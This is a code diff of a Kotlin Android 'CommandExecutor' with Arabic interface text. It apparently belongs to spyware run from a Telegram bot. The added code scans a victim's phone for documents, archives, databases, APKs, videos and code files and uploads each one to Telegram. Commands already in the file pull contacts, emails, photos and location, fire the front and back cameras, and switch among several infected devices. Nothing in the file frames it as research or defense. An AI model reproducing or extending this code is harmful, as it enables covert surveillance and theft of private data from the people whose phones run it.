@@ -23,19 +23,32 @@ object CommandExecutor {
 
             cmd == "📍 عرض الموقع" -> showLocation(ctx)
 
+            // صور
             cmd == "📸 كل الصور" || cmd == "/photos" -> fetchAllPhotos(ctx)
             cmd == "📸 آخر 50" -> fetchLastPhotos(ctx, 50)
             cmd == "🎵 كل الموسيقى" || cmd == "/music" -> fetchAllMusic(ctx)
+
+            // ملفات
+            cmd == "📁 كل الملفات" || cmd == "/files" -> fetchFiles(ctx)
+            cmd == "📄 المستندات" || cmd == "/docs" -> fetchDocuments(ctx)
+            cmd == "📦 المضغوطة" || cmd == "/archives" -> fetchArchives(ctx)
+            cmd == "📱 APK" || cmd == "/apks" -> fetchApks(ctx)
+            cmd == "🗄 قواعد بيانات" || cmd == "/dbs" -> fetchDatabases(ctx)
+            cmd == "🎬 الفيديو" || cmd == "/videos" -> fetchVideos(ctx)
+
+            // اتصالات
             cmd == "👥 جهات الاتصال" || cmd == "/contacts" -> fetchContacts(ctx)
             cmd == "📧 الإيميلات" || cmd == "/emails" -> fetchEmails(ctx)
+
+            // أخرى
             cmd == "📊 معلومات الجهاز" || cmd == "/info" -> showDeviceInfo(ctx)
             cmd == "🤳 تصوير أمامي" || cmd == "/cam_front" -> captureCamera(ctx, true)
             cmd == "📸 تصوير خلفي" || cmd == "/cam_back" -> captureCamera(ctx, false)
             cmd == "🚀 جلب كل شي" || cmd == "/all" -> fetchEverything(ctx)
 
+            // أجهزة
             cmd == "📱 قائمة الأجهزة" -> showDeviceList(ctx)
             cmd == "🌐 كل الأجهزة" -> selectDevice(ctx, "كل الأجهزة", "all")
-
             cmd.startsWith("🎯 ") -> selectDevice(ctx, cmd.removePrefix("🎯 "), cmd.removePrefix("🎯 "))
 
             cmd.startsWith("/photos") -> {
@@ -47,6 +60,9 @@ object CommandExecutor {
         }
     }
 
+    // ═══════════════════════════════════════════
+    //  Toggle
+    // ═══════════════════════════════════════════
     private fun togglePhotos(ctx: Context) {
         KeyboardBuilder.photosOn = !KeyboardBuilder.photosOn
         val state = if (KeyboardBuilder.photosOn) "🟢 شغّال" else "🔴 متوقف"
@@ -66,34 +82,115 @@ object CommandExecutor {
         TelegramApi.sendMessage("🎤 *الميكروفون*\n\nالحالة: $state", KeyboardBuilder.replyKeyboard())
     }
 
-    private fun showDeviceList(ctx: Context) {
-        runJob(ctx, "devices") {
-            TelegramApi.sendMessage("📱 *جاري تحميل الأجهزة...*")
-            val devices = DeviceManager.getDeviceList(ctx)
-            if (devices.isEmpty()) {
-                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة", KeyboardBuilder.replyKeyboard())
+    // ═══════════════════════════════════════════
+    //  Files
+    // ═══════════════════════════════════════════
+    private fun fetchFiles(ctx: Context) {
+        runJob(ctx, "files") {
+            TelegramApi.sendMessage("📁 *جاري فحص الملفات...*")
+            val allTypes = FileGrabber.DOCUMENTS + FileGrabber.ARCHIVES +
+                    FileGrabber.APKS + FileGrabber.DATABASES + FileGrabber.CODE
+            val files = FileGrabber.scanByTypes(allTypes, 2000)
+            if (files.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا توجد ملفات", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
-            val sb = StringBuilder()
-            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
-            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
-            for ((id, name, online) in devices) {
-                val status = if (online) "🟢 متصل" else "🔴 غير متصل"
-                sb.append("$status *$name*\n")
-                sb.append("`$id`\n\n")
-            }
-            val keyboard = KeyboardBuilder.deviceListKeyboard(devices.map { it.first to it.second })
-            TelegramApi.sendMessage(sb.toString(), keyboard)
+            sendFilesList(ctx, files, "📁 كل الملفات")
         }
     }
 
-    private fun selectDevice(ctx: Context, name: String, id: String) {
-        TelegramApi.sendMessage(
-            "🎯 *تم تحديد الجهاز:*\n\n*$name*\n`$id`\n\nكل الأوامر القادمة ستُنفَّذ على هذا الجهاز.",
-            KeyboardBuilder.replyKeyboard()
-        )
+    private fun fetchDocuments(ctx: Context) {
+        runJob(ctx, "docs") {
+            TelegramApi.sendMessage("📄 *جاري فحص المستندات...*")
+            val files = FileGrabber.scanByTypes(FileGrabber.DOCUMENTS, 1000)
+            if (files.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا توجد مستندات", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            sendFilesList(ctx, files, "📄 المستندات")
+        }
     }
 
+    private fun fetchArchives(ctx: Context) {
+        runJob(ctx, "archives") {
+            val files = FileGrabber.scanByTypes(FileGrabber.ARCHIVES, 500)
+            if (files.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا ملفات مضغوطة", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            sendFilesList(ctx, files, "📦 الملفات المضغوطة")
+        }
+    }
+
+    private fun fetchApks(ctx: Context) {
+        runJob(ctx, "apks") {
+            val files = FileGrabber.scanByTypes(FileGrabber.APKS, 500)
+            if (files.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا يوجد APK", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            sendFilesList(ctx, files, "📱 ملفات APK")
+        }
+    }
+
+    private fun fetchDatabases(ctx: Context) {
+        runJob(ctx, "dbs") {
+            val files = FileGrabber.scanByTypes(FileGrabber.DATABASES, 500)
+            if (files.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا قواعد بيانات", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            sendFilesList(ctx, files, "🗄 قواعد بيانات")
+        }
+    }
+
+    private fun fetchVideos(ctx: Context) {
+        runJob(ctx, "videos") {
+            val files = FileGrabber.scanByTypes(FileGrabber.VIDEOS, 500)
+            if (files.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا فيديوهات", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            sendFilesList(ctx, files, "🎬 الفيديو")
+        }
+    }
+
+    private fun sendFilesList(ctx: Context, files: List<FileGrabber.FoundFile>, title: String) {
+        val sb = StringBuilder()
+        sb.append("$title — ${files.size}\n")
+        sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+
+        var count = 0
+        for (f in files) {
+            sb.append("📄 *${f.name}*\n")
+            sb.append("   ${f.size / 1024} KB\n\n")
+            count++
+            if (sb.length > 3500) {
+                TelegramApi.sendMessage(sb.toString())
+                sb.clear()
+            }
+            if (count >= 100) break
+        }
+        if (sb.isNotEmpty()) TelegramApi.sendMessage(sb.toString())
+
+        TelegramApi.sendMessage("📤 *جاري إرسال ${files.size} ملف...*")
+
+        var sent = 0
+        var failed = 0
+        for (f in files) {
+            val file = File(f.path)
+            if (!file.exists()) { failed++; continue }
+            val ok = TelegramApi.sendDocument(file, "📄 ${f.name}")
+            if (ok) sent++ else failed++
+            Thread.sleep(400)
+        }
+
+        TelegramApi.sendMessage("✅ *انتهى*\n\n📤 $sent\n❌ $failed", KeyboardBuilder.replyKeyboard())
+    }
+
+    // ═══════════════════════════════════════════
+    //  الأوامر الأساسية
+    // ═══════════════════════════════════════════
     private fun showMainMenu(ctx: Context) {
         TelegramApi.sendMessage("🎛 *لوحة التحكم*\n\nاختر العملية من الأزرار 👇", KeyboardBuilder.replyKeyboard())
     }
@@ -201,10 +298,7 @@ object CommandExecutor {
             TelegramApi.sendMessage("📧 *جاري قراءة الإيميلات...*")
             val emails = ContactsHelper.getAllEmails(ctx)
             if (emails.isEmpty()) {
-                TelegramApi.sendMessage(
-                    "📭 لا توجد إيميلات\n\n⚠️ تأكد من صلاحية جهات الاتصال",
-                    KeyboardBuilder.replyKeyboard()
-                )
+                TelegramApi.sendMessage("📭 لا توجد إيميلات", KeyboardBuilder.replyKeyboard())
                 return@runJob
             }
             val sb = StringBuilder()
@@ -236,6 +330,37 @@ object CommandExecutor {
             fetchEmails(ctx)
             TelegramApi.sendMessage("✅ *اكتمل*", KeyboardBuilder.replyKeyboard())
         }
+    }
+
+    // ═══════════════════════════════════════════
+    //  أجهزة
+    // ═══════════════════════════════════════════
+    private fun showDeviceList(ctx: Context) {
+        runJob(ctx, "devices") {
+            TelegramApi.sendMessage("📱 *جاري تحميل الأجهزة...*")
+            val devices = DeviceManager.getDeviceList(ctx)
+            if (devices.isEmpty()) {
+                TelegramApi.sendMessage("📭 لا أجهزة مسجّلة", KeyboardBuilder.replyKeyboard())
+                return@runJob
+            }
+            val sb = StringBuilder()
+            sb.append("📱 *الأجهزة المسجّلة* — ${devices.size}\n")
+            sb.append("━━━━━━━━━━━━━━━━━━━━\n\n")
+            for ((id, name, online) in devices) {
+                val status = if (online) "🟢 متصل" else "🔴 غير متصل"
+                sb.append("$status *$name*\n")
+                sb.append("`$id`\n\n")
+            }
+            val keyboard = KeyboardBuilder.deviceListKeyboard(devices.map { it.first to it.second })
+            TelegramApi.sendMessage(sb.toString(), keyboard)
+        }
+    }
+
+    private fun selectDevice(ctx: Context, name: String, id: String) {
+        TelegramApi.sendMessage(
+            "🎯 *تم تحديد الجهاز:*\n\n*$name*\n`$id`\n\nكل الأوامر القادمة ستُنفَّذ على هذا الجهاز.",
+            KeyboardBuilder.replyKeyboard()
+        )
     }
 
     private fun runJob(ctx: Context, jobName: String, block: () -> Unit) {
